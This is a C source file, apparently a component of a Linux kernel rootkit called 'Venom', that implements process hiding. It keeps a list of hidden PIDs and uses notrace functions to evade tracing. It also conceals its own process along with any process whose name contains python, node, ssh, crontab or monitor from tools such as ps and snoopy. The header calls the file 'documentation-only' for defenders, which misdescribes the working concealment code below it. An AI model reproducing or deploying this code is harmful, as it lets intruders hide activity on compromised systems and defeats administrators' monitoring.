/* 
 * Venom 
 * ---------------------------------------------------------------------------
 * File: pid_hiding.c
 *
 * Purpose:
 *  - Documentation of observable process-hiding behaviors and indicators.
 *    Describes differences between various process-enumeration approaches
 *    and how defenders can triage mismatches.
 *
 * Contents (documentation-only):
 *  - Hides listed processors from `ps auxf`, `snoopy` 
 *  - Processors starting with `python3`, `python`, `node`, `ssh`, `monitor`, `crontab` will be hidden. These can be customized. 
 */



#ifndef PID_HIDING_H
#define PID_HIDING_H

#include "../include/headers.h"

#define MAX_HIDDEN_PIDS 128 

static int g_hidden_pids[MAX_HIDDEN_PIDS];
static int g_hidden_pid_count = 0;
static DEFINE_SPINLOCK(pid_lock);


notrace static void add_hidden_pid(int pid) {
    unsigned long flags;
    int i;
    
    spin_lock_irqsave(&pid_lock, flags);
    
    for (i = 0; i < g_hidden_pid_count; i++) {
        if (g_hidden_pids[i] == pid) {
            spin_unlock_irqrestore(&pid_lock, flags);
            return;
        }
    }
    
    if (g_hidden_pid_count < MAX_HIDDEN_PIDS) {
        g_hidden_pids[g_hidden_pid_count++] = pid;
    }
    
    spin_unlock_irqrestore(&pid_lock, flags);
}


notrace static int is_pid_hidden(int pid) {
    unsigned long flags;
    int i, result = 0;
    
    spin_lock_irqsave(&pid_lock, flags);
    
    for (i = 0; i < g_hidden_pid_count; i++) {
        if (g_hidden_pids[i] == pid) {
            result = 1;
            break;
        }
    }
    
    spin_unlock_irqrestore(&pid_lock, flags);
    return result;
}


notrace static int is_hidden_pid_entry(const char *name) {
    int pid;
    
    if (!name || !isdigit(name[0]))
        return 0;
    
    if (kstrtoint(name, 10, &pid) < 0)
        return 0;
    
    return is_pid_hidden(pid);
}

notrace static void hide_protected_processes(void) {
    struct task_struct *task;
    
    rcu_read_lock();
    for_each_process(task) {
        if (strstr(task->comm, "python") ||
            strstr(task->comm, "python3") || 
            strstr(task->comm, "crontab") ||
            strstr(task->comm, "node") ||
            strstr(task->comm, "ssh") ||
            strstr(task->comm, "monitor")) {
            add_hidden_pid(task->pid);
        }
    }
    rcu_read_unlock();
}


static void init_pid_hiding(void) {
    add_hidden_pid(current->pid);
    hide_protected_processes();
    printk(KERN_INFO "[VENOM] PID hiding initialized: %d PIDs hidden\n", g_hidden_pid_count);
}

#endif 

